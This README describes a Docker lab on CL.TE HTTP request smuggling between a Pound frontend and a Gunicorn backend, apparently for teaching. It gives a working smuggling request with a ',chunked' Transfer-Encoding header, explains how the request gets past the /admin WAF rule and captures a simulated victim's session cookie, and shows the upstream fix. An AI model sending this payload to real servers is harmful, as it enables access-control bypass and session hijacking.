# HTTP Request Smuggling (CL.TE) Lab

## Stack

| Role | Technology | Why it is vulnerable |
|------|-----------|----------------------|
| Frontend / WAF | **Pound 4.11.90** (commit `d9a983fe`, 2024-03-12) | Pre-fix for CVE tracked in [GH issue #26](https://github.com/graygnuorg/pound/issues/26). `cs_locate_token()` used an exact string comparison for `"chunked"`. The value `,chunked` does not match, so Pound sets its internal `chunked` flag to `0`, bypasses the anti-smuggling check, falls back to Content-Length for body framing, and forwards both headers verbatim. Fixed in commit `c91cd4b` (2024-03-29). |
| Backend | **Gunicorn 19.9.0** (2018) | Pre-smuggling-research era. Its Transfer-Encoding check used `'chunked' in te` (substring) rather than an exact match, so it accepts `,chunked` and processes the body as chunked transfer encoding. |

## Architecture

```
 Attacker / Victim (host)
          |
      port 80
          |
  +-------------------------------------------------+
  | Pound 4.11.90                                   |
  |  WAF: URL "^/admin" → 403                       |
  |  BUG: TE ",chunked" unrecognised → uses CL      |
  |       forwards BOTH headers to backend          |
  +-------------------------------------------------+
          |  persistent TCP connection (keep-alive)
  +-------------------------------------------------+
  | Gunicorn 19.9.0 + Flask                         |
  |  GET /       — echoes request info              |
  |  GET /admin  — flag + incoming headers (goal)   |
  |  GET /reflect — reflects full request           |
  +-------------------------------------------------+

  victim container: GET / every 3 s
                    Cookie: session=VICTIM_SECRET_TOKEN
```

## Setup

```bash
docker compose up --build
```

The Pound build takes 2-3 minutes (compiled from source).

## Verify the WAF

```bash
curl http://localhost/admin
# 403 — Access to /admin denied

curl http://localhost/
# 200 — normal response
```

## Run the Attack

```bash
python3 attack.py
```

Then watch the victim:

```bash
docker compose logs -f victim
```

The victim's next `GET /` returns the `/admin` response — flag and the victim's
own Cookie header visible in the backend logs.

---

## Attack walkthrough

### The request

```
POST / HTTP/1.1
Host: localhost
Content-Length: 53
Transfer-Encoding: ,chunked
Connection: keep-alive

0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: localhost\r\n
X-Absorb: 
```

### Why each piece behaves the way it does

**Pound (frontend)**

The `cs_locate_token()` call in the vulnerable version did an exact token
match. The value `,chunked` is not equal to `chunked`, so the function returns
NULL. Pound never sets `chunked = 1`. The anti-smuggling check
`if (chunked != 0 && content_length != NO_CONTENT_LENGTH)` evaluates to false
and the request is forwarded as-is, body framed by Content-Length (53 bytes).

**Gunicorn 19.9.0 (backend)**

Receives the forwarded request with both headers. Its TE check is:
`if 'chunked' in transfer_encoding.lower()`. The value `,chunked` contains
the substring `chunked`, so the condition is true. Gunicorn reads the body as
chunked: finds `0\r\n\r\n` (terminating chunk), considers the request body
complete. The remaining 48 bytes (`GET /admin HTTP/1.1\r\nHost: ...\r\nX-Absorb: `)
stay in the kernel receive buffer of the backend TCP connection.

**Connection pool**

Pound returns the backend connection to its keep-alive pool. The victim's
next `GET /` is dispatched over that same connection.

**Victim's request**

Gunicorn reads from the socket and sees:

```
GET /admin HTTP/1.1\r\nHost: localhost\r\nX-Absorb: GET / HTTP/1.1\r\nHost: ...\r\nCookie: session=VICTIM_SECRET_TOKEN\r\n\r\n
```

It parses this as `GET /admin`. The victim's request line (`GET / HTTP/1.1`)
lands as the value of the `X-Absorb` header — harmless. The victim's Cookie
header arrives at `/admin`, which echoes all headers in the response.

**Result:** Pound's WAF never sees `/admin` in the smuggled request. The victim
receives the admin page, and the backend logs show `/admin` was reached with
the victim's session cookie.

---

## Fix (applied in Pound commit `c91cd4b`)

```c
// Before: narrow check — only catches plain "chunked"
if (cs_locate_token(val, "chunked", &next))
    chunked = 1;
// No else — unknown TE left untracked, smuggling check bypassed

// After: proper state machine
if (cs_locate_token(val, "chunked", &next))
    transfer_encoding = TRANSFER_ENCODING_CHUNKED;
else
    transfer_encoding = TRANSFER_ENCODING_UNKNOWN;  // NEW

// Updated smuggling check catches ANY TE + CL combination
if (transfer_encoding != TRANSFER_ENCODING_NONE && content_length != NO_CONTENT_LENGTH)
    return HTTP_STATUS_BAD_REQUEST;
```

## Files

```
http-smuggling/
├── docker-compose.yml
├── attack.py          ← run from host after docker compose up
├── frontend/
│   ├── Dockerfile     ← builds Pound from source at vulnerable commit
│   └── pound.cfg      ← WAF rule + backend config
├── backend/
│   ├── Dockerfile
│   ├── app.py
│   └── requirements.txt
└── victim/
    ├── Dockerfile
    └── victim.py
```
